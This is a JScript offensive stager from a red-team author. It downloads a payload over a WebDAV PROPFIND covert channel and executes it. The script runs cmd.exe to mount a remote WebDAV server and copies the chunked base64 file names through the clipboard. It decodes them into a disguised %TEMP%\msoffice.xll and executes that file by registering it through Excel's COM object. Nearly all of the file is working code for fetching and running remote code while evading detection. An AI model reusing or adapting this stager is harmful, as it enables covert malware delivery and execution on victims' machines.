/*
Author: Arno0x0x - @Arno0x0x

Yet another fancy way of downloading a payload (here an XLL file) using the WebDAV PROPFIND covert channel.

More information here: https://arno0x0x.wordpress.com/2017/09/07/using-webdav-features-as-a-covert-channel/

This requires the 'webdavdelivery.py' from here: https://gist.github.com/Arno0x/5da411c4266e5c440ecb6ffc50b8d29a
On the server side:
./webdavdelivery.py standard payload.xll

This script downloads the XLL file, chunk by chunk over the WebDav PROPFIND channel, from the remote webDav server.
It then reassembles the chunks, sanitize the entry (removing newlines and revert some characters substitution).
The base64 payload is then decoded and written to a temporary file.

Eventually the XLL is registered (and executed) using the Excel.Application COM object.
*/

//-----------------------------------------------------------------------------
// WebDAV server IP or FQDN
var webdavServer = "<===== WebDAV Delivery server IP or FQDN ====>";

// Download the chunks by mounting the WebDAV share and listing all files, then copy the result into the clipboard
var oSh = new ActiveXObject("WScript.Shell");
oSh.Run('cmd.exe /c "pushd \\\\' + webdavServer + ' & dir /b /a-d | clip.exe & popd"', 0, true);

//-----------------------------------------------------------------------------
// Retrieve result from the clipboard and sanitize input
var result = new ActiveXObject('htmlfile').parentWindow.clipboardData.getData('text');
var regex = /(\n|\r)/g; result = result.replace(regex,"");
regex = /_/g; result = result.replace(regex,"/");

//-----------------------------------------------------------------------------
// Decode the base64 object and write it to a temporary file
var outFile = oSh.ExpandEnvironmentStrings("%TEMP%") + "\\msoffice.xll";

adSaveCreateOverWrite = 2 // Mode for ADODB.Stream
adTypeBinary          = 1 // Binary file is encoded

var xmlObj = new ActiveXObject("MSXml2.DOMDocument");
var docElement = xmlObj.createElement("Base64Data");
docElement.dataType = "bin.base64";
docElement.text = result;

var outputStream = new ActiveXObject("ADODB.Stream");
outputStream.Type = adTypeBinary;
outputStream.Open();
outputStream.Write(docElement.nodeTypedValue);
outputStream.SaveToFile(outFile, adSaveCreateOverWrite);
outputStream.Close();

//-----------------------------------------------------------------------------
// Eventually, call the RegisterXLL function from Excel.Application COM object
var excel = new ActiveXObject("Excel.Application");
excel.RegisterXLL(outFile);